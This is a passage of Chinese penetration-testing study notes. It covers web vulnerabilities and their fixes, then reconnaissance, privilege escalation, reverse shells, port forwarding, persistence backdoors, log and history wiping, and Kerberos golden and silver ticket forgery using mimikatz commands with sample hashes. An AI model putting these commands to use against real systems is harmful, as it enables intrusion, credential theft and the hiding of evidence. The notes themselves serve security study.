XXE漏洞原理没有限制XML引入外部实体，当提交一个包含外部实体的XML请求时，外部实体的内容就会执行 修复 禁止使用外部实体 过滤用户提交的XML数据，防止出现非法内容 逻辑漏洞一、原理逻辑漏洞就是指攻击者利用业务设计缺陷，获取敏感信息或破坏业务完整性。一般出现在密码修改、越权访问、密码找回、交易支付金额等功能处。 二、修复 严格验证请求者的身份 登录成功后再次访问，从session中调取用户名密码，而不是由用户传入 任意修改订单金额原理： 后端校验不严格。利用： 在提交订单的时候抓取数据包对数据包的内容进行修改，或者直接修改前端价格处的代码。 预防思路：将订单进行多重校验。 可将下单过程分为提交订单请求和支付请求，当用户发送提交订单请求时，服务端根据商品ID和金额等信息生成一个复杂的哈希值，然后又发送一个支付请求，服务端将支付金额又进行哈希计算，与前一次的哈希值进行匹配，匹配成功则该订单生效；如果在发送支付请求的过程中将订单金额修改了，那么生成的哈希值就与前一次不匹配，则订单不生效。 验证码回传原理： 用户发送验证码请求后，服务端将验证码发送给用户本地（或者用户邮箱或手机）。利用： 抓取Response数据包，里面就包含了验证码。预防方式： 不在Response数据包中存放验证码，将生成的验证码和用户输入的验证码传给服务器，在后端进行匹配，相同则验证成功。缺点：服务器压力增加。 生成验证码后将验证码明文发送给用户手机或邮箱，将加密后的验证码放入到Response包中返回到用户本地，用户输入后，将验证码进行加密，与Response包中加密的验证码进行对比，相同则验证成功。 越权漏洞原理： 在访问一些页面时，对用户的登录信息校验存在缺陷，导致攻击者可以直接访问别人的信息页面等。利用： 观察url的格式特征，例如不同的用户在登录情况下对应url中不同的ID号，或者在url中标明执行的操作，比如action=edit或action=delete之类的。观察到了url具有一定的规则后，就可以尝试是否存在越权漏洞。预防方式： 在用户跳转访问其他页面时，对用户的cookie、ssid、token等身份信息进行验证，验证成功再进行跳转。 密码找回存在缺陷一、原理： 在找回密码输入验证码后，在返回包中存在一个验证码是否正确的标识位，如果这个标识只在前端进行验证，那么就可以通过修改这个标识位来实现修改任意用户密码。利用： 自己注册一个用户，然后选择找回密码，输入正确验证码后，抓包查看返回包的格式，然后找回别的用户的密码，抓取返回包，按照验证码正确的格式修改返回包。二、 在通过手机验证码找回时，网站向用户手机发送验证码，这个时候如果没有对手机号进行验证验证，就可以通过修改验证码发送到的手机号，这样就获取到了找回其他用户密码的验证码。三、 找回密码的验证码位数很少，并且没有输入错误 次数的限制，就可以对验证码进行爆破。 JSONP跨域漏洞一、概念 可以让网页从别的域名(网站)获取资料，即跨域读取数据。同源策略：不同域的客户端脚本在没有明确授权的情况下，不能读写对方的资源。 由于同源策略，两个不同源的网站是无法进行沟通的，但是可以使用HTML中的&lt;script&gt;标签引用不同源上的文件，这就是JSONP。用 JSONP 抓到的资料并不是 JSON，而是任意的JavaScript，用 JavaScript 直译器执行而不是用 JSON 解析器解析。 类似于钓鱼 JSONP是基于JSON格式的为解决跨域请求资源而产生的解决方案。跨域原理： JSONP 实现的基本原理是利用了 HTML 里 &lt;script&gt;&lt;/script&gt;元素标签，远程调用 JSON 文件来实现数据传递。 使用&lt;script&gt;标签，将里面的 src 属性设置为要请求的地址： &lt;script src=&quot;http::localhost:8081/test.php&quot;/&gt; &lt;script&gt;标签会自动解析并执行返回的内容，如果这些内容不是完整的 JavaScript 代码，程序就会报错，所以在进行 JSONP 跨域请求时，需要保证服务器返回一段完整的 JavaScript 代码； 但是也不能只返回纯 JSON 数据，因为 JSON 数据会自动转换为一个 JavaScript 对象，如果不将其分配给变量或传递给函数，就无法使用； 那么，在请求中定义一个回调函数（被作为参数传递的函数），服务器接收这个回调函数，并将要返回的 JSON 数据作为函数的参数一同返回，这样&lt;script&gt;标签在解析并执行返回内容时就会自动调用这个函数；（服务器返会的内容必须是一段可执行的 JavaScript 代码） &lt;script src=&quot;http::localhost:8081/test.php?callback=getCookie&quot;/&gt; 二、作用导致XSS： 在JSNOP跨域中我们可以传入一个自定义函数名参数，服务端就会动态生成对应的JSNOP数据，这个时候如果对传入的参数处理不当，如未正确设置响应包的Content-Type、未对用户输入参数进行有效过滤或转义时，就会导致XSS漏洞的产生。 防御：设置Content-type: application/json，这样浏览器不会将恶意插入的xss代码当作html文档来解析，而是将其是为JSON数据来解析，从而起到防御作用。 JSONP劫持当某网站通过 JSONP 的方式来跨域（一般为子域）传递用户认证后的敏感信息时，攻击者可以构造恶意的 JSONP 调用页面，诱导被攻击者访问来达到截取用户敏感信息的目的。[jsonp-1] JSONP劫持用户信息用户登录目标网站后，访问了含恶意网站（该网站含有回调函数和向目标网站发送请求的代码），用户就会向目标发展发送请求，返回JSONP劫持防护方法：1、严格安全的实现 CSRF 方式调用 JSON 文件：限制 Referer 、部署一次性 Token 等。2、严格安装 JSON 格式标准输出 Content-Type 及编码（ Content-Type : application&#x2F;json; charset&#x3D;utf-8 ）。3、严格过滤 callback 函数名及 JSON 里数据的输出。4、严格限制对 JSONP 输出 callback 函数名的长度(如防御上面 flash 输出的方法)。5、其他一些比较“猥琐”的方法：如在 Callback 输出之前加入其他字符(如：/**/、回车换行)这样不影响 JSON 文件加载，又能一定程度预防其他文件格式的输出。还比如 Gmail 早起使用 AJAX 的方式获取 JSON ，听过在输出 JSON 之前加入 while(1) ;这样的代码来防止 JS 远程调用。 CORS一、概述 CORS即跨域资源共享，用于绕过同源策略来实现跨域资源访问的一种技术。CORS漏洞则是利用CORS技术窃取用户敏感数据。 Web应用程序可以通过在HTTP报文中增加特定字段来告诉浏览器哪些源的服务器可以访问本站。 二、跨域流程分为简单请求和非简单请求。简单请求同时满足： 请求方式是HEAD,GET,POST三种之一 HTTP头的信息只有Accept，Accept-Language，Content-Language，Lat-Event-ID，Content-Type这几个字段 简单请求的流程： 发起请求后，浏览器发现这是一次简单请求，然后在HTTP头中增加一个Origin字段，标明这次的请求来自哪个域。服务器接收请求后判断Origin字段的域是否在允许请求的范围内，如果在允许范围内，服务器会在响应包中增加三个与CORF相关的字段： Access-Control-Allow-Origin：该字段是必须存在的，它的值可以是 Origin 字段的值，也可以是一个通配符*，表示可以接受任意域名的请求，大部分服务器如果配置了通配符的话，信息泄露的风险骤然加大； Access-Control-Allow-Credentials：字段不是必选字段，它的值只能设置为 true，表示服务器允许浏览器将 cookie 包含在请求中，否则就不添加此字段。需要注意的是，如果要发送 cookie，Access-Control-Allow-Origin 就不能设为星号，必须明确指定与请求网页一致的域名(同时Cookie依然遵循同源策略)。 Access-Control-Expose-Headers：该字段主要是指定想要获取 XMLHttpRequest对象中getResponseHeader()方法的其他服务器字段。[cors-1] 非简单请求的流程： 非简单请求会对浏览器提出特殊要求的请求，请求方式为PUT或DELETE等。 非简单请求会在正式通信前增加一个HTTP查询请求（称之为“预检请求”），（预检包的请求头是 OPTIONS，并携带三个关键字段：Origin(来源)、Access-Control-Request-Method(请求方法)、Access-Control-Request-Headers(请求额外发送的字段)）。 当浏览器收到非简单请求后会先询问服务器，当前网页所在的域是否在允许请求服务器的名单内，以及可以使用哪些HTT字段等，只有收到了肯定的响应，浏览器才会正式发出通信请求，并且设置以后对该服务器的请求都使用简单请求。 服务器否定了预检请求的话会生成不包含CORS相关信息的HTTP回应，拒绝跨域请求；肯定了预检请求的话就会生成一个包含CORS相关信息的HTTP回应，允许跨域请求。 (这样做的好处是给没有使用CORS的服务器减小压力，给了服务器一个提前拒绝的机会。) [cors-2] CORS漏洞 原因： 服务端配置不当，设置了Access-Control-Allow-Origin: *，允许任意域请求，那同源策略就成了摆设，反而增加了风险。 一、如何检测CORS跨域漏洞使用burp在请求包中加上Origin字段，访问我们认为可能有漏洞的网站，查看响应包中是否含有CORS相关的字段，如果返回： 实锤存在： 有且仅有如下请求头 Access-Control-Allow-Origin: * 实锤存在：同时存在如下两个请求头 Access-Control-Allow-Origin:  Access-Control-Allow-Credentials: true 可能存在：同时存在如下两个请求头 Access-Control-Allow-Origin: null Access-Control-Allow-Credentials: true 一定不存在：（浏览器会自动阻止） Access-Control-Allow-Origin: * Access-Control-Allow-Credentials: true 二、结合XSS如果CORS配置了信任自身的任意子域，那么当一个子域存在XSS漏洞时，就可以通过这个漏洞去读取其他子域的资源。 三、防护方案 关闭不必要开启的CORS。 利用白名单来限制能够获取资源的域。（不要将Access-Control-Allow-Origin设置为*或NULL，严格校验来自请求数据包中的Origin的值） 只有在接收到跨域请求时才配置有关于跨域的头部，并且要确保跨域请求是合法的源，以减少攻击者恶意利用的可能性。(4. 仅允许使用安全协议，避免中间人攻击； 尽可能的返回 Vary: Origin 头部，以避免攻击者利用浏览器缓存进行攻击； 避免将 Access-Control-Allow-Credentials 标头设置为默认值 true ，跨域请求若不存在必要的凭证数据，则根据实际情况将其设置为 false； 限制跨域请求允许的方法，Access-Control-Allow-Methods 最大限度地减少所涉及的方法，降低风险； 限制浏览器缓存期限：建议通过 Access-Control-Allow-Methods 和 Access-Control-Allow-Headers 头部，限制浏览器缓存信息的时间。通过配置 Access-Control-Max-Age 标头来完成，该头部接收时间数作为输入，该数字是浏览器保存缓存的时间。配置相对较低的值，确保浏览器在短时间内可以更新策略；） 渗透测试工具收集域名信息，子域名，对应的IP，whois信息，ICP备案查询，微信公众号，移动APP，旁站，C段，开放端口，敏感接口，目录扫描 一、工具天眼查，whois，搜索引擎(sodan、zoomeye、fofa)，github，一些脚本工具，nmap，oneforall，Layer子域名挖掘机。。 nmap扫描原理：常用参数：6. -sL 列出指定网络上的每台主机（不发送任何报文到主机）。7. -sn（-sP） 无端口扫描，探测目标是否可达（在局域网内，该扫描不会发送ICMP报文，而是会广播ARP报文）8. –dns-servers 指定DNS服务器来进行端口扫描（指定一个或多个dns服务器可以扫描得更快）9. -sT TCP全链接扫描，主机会与目标端口进行三次握手，建立完整的TCP连接（扫描速度慢，网络流量大，容易被发现）10. -sS TCP、SYN扫描，主机向目标端口发送SYN报文，如果目标端口返回了[ACK,SYN]标识，主机就发送RST断开连接（这种扫描方式速度快，被广泛使用）11. -sA TCP、ACK扫描，主机向目标端口发送ACK报文，如果目标端口返回了RST，就说明目标端口是开放的（该方式可以用来绕过防火墙）12. -sU UDP扫描，通过向带你看发送UDP数据包来判断开启了哪些UDP服务（UDP扫描通常比TCP扫描慢，可以同时进行TCP、UDP扫描）13. -P 设置端口扫描范围14. –exclude-ports 排除不需要扫描的端口15. -F 快速扫描（这里按照nmap内置的最常用的端口表进行扫描，扫描数量比默认的更少，时间也会更短一些）16. -r 让扫描顺序按照由低到高 的顺序进行扫描（正常情况下，为了扫描效率，端口扫描的顺序是随机的）17. -top-ports 扫描nmap的端口表里最常见的前n个端口18. -sV 检测目标运行的服务版本19. -O 检测目标的操作系统20. –host-timeout 设置扫描一个目标所等待的最长时间21. -v 提高输出信息的详细程度22. -A 启动强力扫描模式（该模式下会默认启动操作系统检测和版本扫描）23. -6 启用IPv6扫描 nmap ：包含主机发现、端口扫描、版本侦测、操作系统侦测等功能。 -sn 只进行主机发现过程，不进行端口扫描等操作； -Pn 跳过主机发现过程，直接进行端口扫描等操作； -n 不使用DNS解析 主机发现原理： 向目标主机发送多个数据包来探测包，若收到其中一个回复，则说明目标主机是开启的；可以发 ICMP echo、TCP&#x2F;SYN&#x2F;ACK等端口扫描原理： TCP SYN：开启-ACK-RST，未开启-RST； 渗透测试流程 信息收集 根据收集到的信息判断是否存在可利用的漏洞 使用存在漏洞进行攻击 功能点测试 一、信息收集 whois可以查询到域名注册信息； ping检测可以查到域名对应的IP地址 nmap扫描目标地址开放的端口和服务 指纹识别，查看是否使用了存在漏洞的框架（指纹：可以用来定位目标的某些特征） 使用工具扫描（Nessus、AWVS），查看是否存在漏洞 如果存在漏洞，就可以用msf去打，拿到shell 拿到Meterpreter shell后将这个shell迁移到一个稳定的进程中，避免原来的目标应用关闭而断开连接 shell稳定后，可以执行一些命令来查询目标机的信息，如：操作系统版本，当前权限，是否开启防火墙，是否运行在虚拟机上，最近运行的时间等 可以查看登录主机的用户，以及抓取他们的密码（hashdump、Quarks PwDump、Windows Credentials Editor、Mimikatz） 功能点手动测试，对一些常用的路径进行探测，也可以对网站目录进行扫描 信息收集的内容：企业信息收集 公司的域名、子域名、全资子公司、IP信息等 判断收集到子域名受否为泛解析，IP是否为真实IP，开放了哪些端口，web网站使用的框架，中间件，服务器操作系统等。 如何判断子域名泛解析？ 任意构造一个三级域名，如果能正确解析，就存在泛解析 判断是否使用cdn：ping一下目标域名，如果ping出来的域名和我ping的域名不一样，就说明使用cdn；有的在线网站进行ping检测，如果ping出来多个IP地址，就说明使用了cdn；如果只有一个IP，就是真实IP； &#x2F;&#x2F;全球ping &#x2F;&#x2F;全球ping 子域名收集方式： 子域名收集工具：OneForAll、子域名挖掘机、ksubdomain 在线子域名收集网站 github上一些别人已经收集好的子域名； 字典爆破 空间搜索引擎，如fofa、zoomeye、shodan （语法：domain:baidu.com） google语法搜索(site:*.baidu.com) 利用脚本爬取网页代码中的子域名信息 IP反查 通过DNS A记录查询() 利用证书透明度收集子域在一些证书查询网站，可以查得子域名的SSL证书google： ：：： 获取目标web信息： 收集web的框架信息：一些识别框架的在线网站(），浏览器中的插件(wappalyzer)，js中有可能会泄露框架相关信息，根据错误页面判断(ThinkPHP)，whatweb 收集web目录信息：使用目录工具扫描(御剑、dirsearch、字典爆破) 收集敏感信息：使用工具收集js中的敏感信息(JSFinder)，注意观察网站内容有没有泄露扫描有用的信息 后台信息收集：通过目录扫描看有没有找到后台登录地址，通过已知的框架在网上查有没有默认后台地址，通过观察url特点看可不可以猜出后台地址 常用端口服务：[shentou-1][shentou-2][shentou-3] 二、提权方式提权方式可分为本地溢出提权，数据库提权，第三方软件提权，内核提权，权限配置不当等Windows提权系统漏洞提权： 可以使用Windows系统漏洞进行提权；(Windows中的可执行程序有.com和.exe)； 拿到shell后执行systeminfo查看主机的系统信息，看系统的版本，看打了哪些补丁，找到主机没有打补丁又可利用的权限提升漏洞； 然后可以通过msf进行提权（生成exe，上传到目标主机上，然后运行即可提权） 常见提取漏洞：ms13_053，ms14_058，ms16_016，ms14-068(2003&#x2F;2008&#x2F;2012&#x2F;7&#x2F;8)等 Linux提权内核提权： 查看内核版本(uname -a)，使用searchsploit搜索符合版本的漏洞，将对应的exp上传到目标主机上，编译后执行即可提权。 例如脏牛提权（CVE-2016-5195），当Linux内核大于2.6.22（2007发现，2016修复），低权限用户可以利用该漏洞在全版本的Linux系统上实现本地提权。权限配置不当提权： 例如SUID提权，就是某个程序执行时是以高权限运行的，比如root权限，当普通用户在运行这个程序的时候，就相当于拥有了root权限，就可以利用root权限执行命令；用find命令查看SUID可执行的文件：find / -per （-4000） 2&gt;/dev/nullfind执行命令touch aaafind / -name aaa -exec &quot;whoami&quot; \\ 局限： 只对二进制程序有效 只在程序执行过程中才能拥有高权限 数据库提权：例如UDF提权，在MySQL的 lib&#x2F;plugin 目录下创建一个udf.dll文件，在文件中定义一个sys_eval()函数，这个函数可以执行系统命令，从udf文件中引入自定义函数，这样就可以使用自定义函数执行命令了。 MOF提权，MOF文件每五秒就会执行一次，上传MOF文件，文件中写入的是创建新用户的命令，这样当文件执行的时候就会创建新用户。缓冲区溢出提权（git提权）原理：在没有栈保护的时候，可以覆盖栈帧的返回地址，然后控制函数流程，从而达到提权的目的。执行sudi git -p help，在末尾输入!/bin/bash sudo提权CVE-2019-14287，作用于sudo低于1.8.28的版本执行在duso后面加上-u#数字就可以执行当前权限不能执行的命令（例如sudo -u#数字 id[命令]） CVE-2021-3156，作用于sudo 1.9.0到1.9.5怕所有稳定版，1.8.2到1.8.31篇所有旧版本（未安装patch） 反弹shell一、什么是反弹shell反弹shell（reverse shell），就是控制端监听在某TCP&#x2F;UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端的角色反转。 二、正向连接假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面，web服务，ssh，telnet等等，都是正向连接。三、类型bash反弹、nc反弹、PHP反弹、python反弹、perl反弹、socat反弹、msf生成exe木马上传反弹 端口转发、端口映射 端口转发是将外网是一个端口的通信完全转发给内网一个地址的指定端口，只能实现外网到内网的单向通信（就是把外网中我们不能访问到的主机的端口，转发到一个我们能访问到的内网主机的端口上）。 端口映射是将外网的一个端口完全映射给内网地址的指定端口，可以实现内外网的双向通信。（也就是说当外网用户访问外网端口时，其实就是在访问内网的指定端口提供的服务） 端口转发的方式： SSH端口转发（双方通过SSH登录后，在SSH客户端与SSH服务端之间建立一个隧道，从而进行通信） 本地端口转发（将发送给本地端口的请求转发到另一个目标地址的端口） ssh -L 本地网卡地址:本地端口:目标地址:目标端口 远程端口转发（将发送到远程端口的请求转发到目标地址的端口） ssh -R 远程网卡地址:远程端口:目标地址:目标端口 动态端口转发 （将本地向目标地址发起的请求先转发到另一个端口，再通过这个端口向目标地址发起请求）ssh -D 本地网卡地址:本地端口 链式端口转发（在内外网的环境下，外网主机要访问内网主机，可以先通过本地端口转发，将请求发送到另一个端口，再通过这个端口将请求转发到能访问内网服务的远程主机上，再通过这个远程主机将请求转发给内网主机） ssh -L .... 再ssh -R .... LCX端口转发工具（windows）在公网主机上进行监听，命令lcx.exe -listen 4444 6666，意思是将公网主机4444端口的请求转发到6666端口；在（一个只有webshell的）肉鸡上执行lcx.exe -slave 公网ip 4444 肉鸡内网IP 3389，意思是将肉鸡3389端口的流量都转发到公网主机的4444端口上；当访问(公网IP)6666端口时，就可以远程连接到肉鸡上（进入内网）。 SOCKS5代理1. 概述：socks5是一个传输层的代理协议（通过TCP&#x2F;IP进行通信），前端的请求数据包经过socks5服务器原封不动的转发给目标服务器（用于内部网络需要访问外部网络的情况下，例如国内翻墙访问国外网站）（要求：前端要有socks5的接口）； HTTP代理是通过HTTP协议进行通信，在转发请求数据包的过程中可能会修改其中的内容。 2. 实现代理的方法： MSF 代理模块建立 获得meterpreter shell后，可以使用auxiliary/server/socks_proxy 模块设置代理（设置版本为5）； 设置好代理主机的IP和端口，把代理添加到/etc/proxychains.conf文件中，然后可以使用proxychains测试是否能访问到目标内网。 SSH建立SOCKS5代理 使用SSH命令建立SOCKS5代理服务器，ssh -f -N -D 指定绑定ip地址:指定监听端口 远程ssh服务器登录名@ssh服务器地址(经过指定端口的代理请求数据会通过建立的ssh隧道转发到目标服务器上) -f 进入后台模式 -N 不执行远程命令 -D 指定本地“动态”应用程序级端口转发。(ssh将充当socks服务器) 结束代理：找到SSH所运行的进程，结束进程即可结束代理。 使用python脚本 权限维持Windows： 使用粘滞键后门进行权限维持(例如将Sethc.exe换成cmd.exe，就可以在未登录目标主机时调用cmd)； 在目标主机的startup目录写入一个反弹shell的脚本，只要目标机启动，就会自动执行脚本； 写计划任务 添加影子账户（在net user命令下看不到，只能在注册表里看到）； Powershell权限维持，在受害机运行下载权限维持脚本的命令，本地开启监听就可以了 使用NC，在受害者的主机是上传NC，修改注册表将NC设为自启动，只要在自己的服务器上一直开启监听，那么每当受害者主机开机之后都会主动连接我们的服务器；（在自己的服务器上进行监听，在受害者的主机上执行nc命令，修改注册表，将nc连接命令设为自启动） 使用msf权限维持模块（persistence）生成后门并设置用户登录后自启动，当用户启动计算机就会反弹shell；（前提是先获得一个Meterpreter shell） Linux： 使用msf权限维持模块（persistence）生成后门并设置用户登录后自启动；（前提是先获得一个Meterpretershell） 使用NC，在受害者的主机是上传NC，修改注册表将NC设为自启动，只要在自己的服务器上一直开启监听，那么每当受害者主机开机之后都会主动连接我们的服务器；（在自己的服务器上进行监听，在受害者的主机上执行nc命令，修改注册表，将nc连接命令设为自启动） 写计划任务 SSH后门（写SSH公钥(生成密钥对ssh-keygen -t rsa，向服务器写公钥，登录时用私钥连接 ) 添加root户(通过修改passwd和shadow文件) 痕迹清理Windows下 日志文件有系统日志，安全日志，应用程序日志 手动清除日志（开始-程序-管理工具-计算机管理-系统工具-事件查看器-清除日志，win+R输入eventvwr.msc打开事件查看器，清楚操作痕迹） 使用工具清除（wevtuil，el枚举日志，cl删除日志） msf自带的清除日志功能 当连接了目标机的3389端口后，会生成一个default.rdp文件，其中记录了远程连接的相关信息 删除‘最近使用文件’目录下所操作过的文件记录（C:\\Users\\Administrator\\Recent），或执行命令del /f /s /q “%userprofile%\\Recent*.* Linux下 清除history历史命令记录- 编辑history记录文件，删除不想被保存的历史命令（history - r删除当前会话历史记录，history -c删除内存中的所有命令历史，rm .bash_history删除历史文件中的内容）- 利用vim特性删除历史命令（使用vim打开一个文件vi test.txt，设置vim不记录命令，vim会将历史命令记录保存在viminfo文件中:set history=0，打开命令记录文件.bash_history，编辑文件删除历史历史操作命令vsp ~/.bash_history，清楚保存.bash_hostory文件）- 在vim中执行主机不想让别人看见的命令- 修改配置文件/etc/profile，是系统不保存命令记录 清楚系统日志痕迹（&#x2F;var&#x2F;log&#x2F;btmp 记录所有登录失败信息，使用lastb命令查看；&#x2F;var&#x2F;log&#x2F;lastlog 记录系统中所有用户最后一次登录时间的日志，使用lastlog命令查看；&#x2F;var&#x2F;log&#x2F;wtmp 记录所有用户的登录、注销信息，使用last命令查看；&#x2F;var&#x2F;log&#x2F;utmp 记录当前已经登录的用户信息，使用w,who,users等命令查看；&#x2F;var&#x2F;log&#x2F;secure 记录与安全相关的日志信息；&#x2F;var&#x2F;log&#x2F;message 记录系统启动后的信息和错误日志）- 清空日志文件（清除登录失败的记录，清除登录成功的记录，清除相关日志信息）- 删除&#x2F;替换与当天日期或自己登录的IP相匹配的信息 清除web入侵痕迹（替换日志ip地址，清除部分相关日志） 隐藏远程SSH登录记录 内网渗透流程 拿下目标战点的webshell后，然后将shell反弹到msf上，用msf生成一个木马，下载到目标机上，msf开启监听，目标机运行木马就可以了； 查看当前权限，对目标机进行提权 可以查看目标主机的系统信息、登录过的用户信息、是否在一个域中等 然后可以抓取登录用户的密码，运气好可能直接抓到administor的密码 可以查看路由表，是否有另外的网段，如果有另一个网段，那么就可能是他的内网网段，接着添加一条路由，然后设置代理，方便访问内网 然后进行横向渗透，进入内网后就可以通过目标主机去访问内网中的其他主机，去扫描收集他们开放的端口和系统版本等信息，寻找是否有可利用的漏洞等，步骤差不多，条件合适就可以拿下域成员以及域控主机。 Kerberos协议是一种计算机网络认证协议，能够为网络中通信的双方提供认证服务（当客户端发起请求后，需要进行一系列的身份认证，确定双方身份都没错之后才建立连接)。一、Kerberos协议组成： 客户端 服务端 密钥分发中心(KDC，Key Distribution Center)（krbtgt：KDC服务使用的服务帐户) 认证服务器AS：用来认证客户端的身份并发放客户用于访问TGS的TGT 票据授权票据TGT（Ticket Granting Ticket，票据授予票据) 票据授权服务器TGS（Ticket Granting Server)：用来发放身份认证票据（发放整个认证过程以及客户端访问服务端时所需要的服务授权票据，向客户端和服务端分别发放Session_Key)（- 特定服务器SS） [TGT-1]二、认证流程：[kerberos-1] 黄金票据 概述：黄金票据(Golden Ticket)就是伪造TGT（只要有了高权限的TGT，就可以发送给TGS，从而获取任意服务的ST（可以说有了黄金票据就有了域内的最高权限）） 制作黄金票据： 获取域名称：net view /domain mimikatz获取krbtgt账户的NTML-Hash值以及SID：mimikatz &quot;lsadump::dcsync /domain:test666.com /user:krbtgt&quot; 使用mimikatz生成黄金票据：kerberos::golden /admin:administrator /domain:0day.org /sid:S-1-5-21-1812960810-2335050734-3517558805 /krbtgt:36f9d9e6d98ecf8307baf4f46ef842a2 /ticket:golden.kiribi（SID去除最后一个-及后面的值。&#x2F;admin：伪造的用户名，&#x2F;domain：域名称，&#x2F;sid：SID值，注意是去掉最后一个-后面的值，&#x2F;krbtgt：krbtgt的HASH值，&#x2F;ticket：生成的票据名称） 使用mimikatz的Kerberos:ptt功能将黄金票据导入到内存中，然后就可以通过dir成功访问域控的共享文件夹。 这种方式导入的Ticket默认在20分钟以内生效，过期了再次导入就可以了；可以伪造任意用户，包括不存在的用户；krbtgt的NTLM hash不会轻易改变，即使修改域控管理员密码。 黄金票据的防御： 限制域管理员登录除域控制器和少数管理服务器以外的任何其他计算机，将所有其他权限委派给自定义管理员组 禁用krbtgt账户，并保存当前的密码以及以前的密码 白银票据 概述： 白银票据(Silver Tickets)就是伪造ST(Service Ticket)，由于TGT中已经限定了服务，所以白银票据就只能访问指定服务； 利用服务端的账户密码hash直接生成ST，发给服务端进行验证，可以伪造客户端访问服务端的权限（，从而获取高权限的资源等）； 制作白银票据： 获取服务端账户密码的ntlm-hash值：mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot; &gt; 1.txt 制作银票：kerberos::golden /domain:0day.org /sid:S-1-5-21-1812960810-2335050734-3517558805 /target:OWA2010SP3.0day.org /service:cifs /rc4:125445ed1d553393cce9585e64e3fa07 /user:silver /ptt(&#x2F;domain：当前域名称，&#x2F;sid：SID值，&#x2F;target：目标主机，&#x2F;service：服务名称，&#x2F;rc4：目标主机的hash值，&#x2F;user：伪造的用户名，&#x2F;ppt：将生成的票据导入内存) 然后就可以使用dir（dir \\\\OWA2010SP3.0day.org\\c$）访问服务端的共享文件夹 服务示例：[ST-1]定位域控：命令nslookup +域名 MS14-068原理这是一个可以域内提权的漏洞，可以将普通用户权限提升为域管理员权限；原理是通过客户端伪造高权限的PAC 在客户端向KDC发起认证请求的数据包中，有一个include-PAC的标志，并且这个标志被设置为了false，所以在KDC返回的TGT中不包含PAC； 然后我们就可以自己构造PAC，微软规定PAC由User SID &amp; Group SID、和经过带有Server_Key、KDC_key的签名算法组成；但是实际上却允许使用任意签名算法，客户端指定哪种算法，KDC就会那种算法进行签名验证；所以可以构造高权限的User SID &amp; Group SID，使用不带key的MD5算法进行签名，只对SID进行MD5运算； 然后将PAC放在请求包中发送给TGS，这里因为TGT加密了，所以并没有放在TGT中；在构造请求包的过程中，使用客户端产生的一个随机数对PAC进行加密，并且将这个随机数也发送给TGS； TGS收到请求包后会把PAC解密出来，并且验证身份信息为合法；还会把TGT也解密出来，得到CT_SK；然后TGS会使用服务端产生的key和CS之间key生成一个带key的签名替换到PAC后面，并且把CT_SK用客户端产生的随机数进行加密，从而组成一个新的TGT返回给客户端； 所以相当于是向TGS申请了一个带有PAC的TGT，然后再向KDC申请ST。 突破“本地账户才能利用”的限制 本地账户与域用户的区别在于，本地用户在使用mimikatz向内存注入缓存证书之前，内存中的缓存证书为0个，域用户在mimikatz注入之前缓存证书有4个； 当要访问域控时，系统会先在缓存的证书中查找是否存在ST，不存在则寻找TGT，然后向KDC申请ST； 而域用户本身就存在ST，所以就不用再申请，也就没有伪造的机会；那么只要把域用户中缓存的证书全部清除，就可以利用漏洞伪造PAC，生成高权限的TGT，然后申请到一个高权限的ST，这样就可以在域用户下提升为域管理员权限。 PHP代码审计一、通用代码审计思路 逆向追踪，根据敏感关键字回溯参数传递过程 正向追踪，查找可控变量，跟踪变量传递过程 寻找敏感功能点，通读功能点代码 直接通读全文代码 二、审计方式黑盒测试：在不接触代码的情况下，在功能点测试系统有没有bug，是否满足设计需求；白盒测试：直接从代码层面寻找是否有漏洞；灰盒测试：介于白盒与黑盒之间的一种测试，灰盒测试多用于集成测试阶段，不仅关注输出，输入的正确性，同时也关注程序内部情况。 PHP反序列化漏洞[serialize-1][serialize-2] 一、魔术方法 __construct()当一个对象创建时被调用 __destruct()当一个对象销毁时被调用 __toString()当反序列化后的对象被输出的时候(转化为字符串的时候)被调用 __sleep() 在对象在被序列化之前运行 __wakeup将在序列化之后立即被调用 一般是从__destruct方法入手，也就是当一个对象被销毁时会调用这个方法，跟踪该方法中调用到的其他方法，找到使用了危险函数的地方，判断参数是否可控，若可控，则传入恶意内容。 二、__wakeup绕过对象属性个数的值大于真实的属性个数时就会跳过__wakeup()的执行。 三、PHP session工作流程 当开始一个会话时，PHP会尝试从请求中查找会话 ID （通常通过会话 cookie），如果发现请求的Cookie、Get、Post中不存在session id，PHP 就会自动调用php_session_create_id函数创建一个新的会话，并且在http response中通过set-cookie头部发送给客户端保存。 [serialize-3]四、PHP session的存储机制PHP session的存储机制是由session.serialize_handler来定义引擎的，默认是以文件的方式存储，且存储的文件是由sess_sessionid来决定文件名的，当然这个文件名也不是不变的，都是sess_sessionid形式五、session的反序列化漏洞利用当使用php_serialize处理器生成序列化结果时，存储格式中存在|，再使用php处理器取出时，|会被当成键值对的分隔符，在特定地方会造成反序列化漏洞。 PHP漏洞分析Laravel框架特征漏洞版本Laravel 5.7 反序列化RCE从__destruct方法看起，进入run()方法，又继续跟进，在createABufferedOutputMock()方法中，foreach对test类中的expectedOutput属性进行遍历，但是并不存在这个属性，所以当访问一个不存在的属性的时候会触发__get()方法，而get()方法中的attributes参数是可控的，所以我们可以构造键名为expectedOutput的数组，就可以顺利走出循环；后面还有一个foreach循环也是同样的道理，构造键名为expectedQuestions的数组；漏洞关键点在run()方法中调用的call()方法，这个方法又使用了call_user_func()，$callback参数可控，Laravel 5.8 反序列化RCE触发点在dispatchToQueue()方法，这个方式里面用到了call_user_func函数，并且call_user_func的两个参数是可控的；第一个queueResolver参数会在调用__condtruct方法时被调用进来，可以将它赋为system；第二个参数$connection是来自于$command，而$command需要继承于ShouldQueue接口，所以找一个继承于该接口的类，添加$connection变量，将值赋为恶意命令就可以了。 ThinkPHP框架特征漏洞版本5.0 method任意调用方法导致RCEpayload1：?s=captcha 